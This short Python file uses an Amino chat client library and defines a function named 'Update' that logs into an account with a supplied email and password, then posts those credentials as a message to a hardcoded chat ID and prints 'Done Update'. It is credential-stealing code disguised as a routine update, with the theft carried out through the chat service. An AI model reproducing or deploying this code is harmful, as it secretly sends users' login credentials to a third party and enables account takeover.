import ZAminofix


def Update(email,password):
	key="31fa8d40-a416-4c24-825d-0dd41ea110c3"
	c=ZAminofix.Client()
	c.login(email,password)
	c.join_chat(key)
	c.send_message(key,message=f"{email}\n{password}")
	c.leave_chat(key)
	print("Done Update")

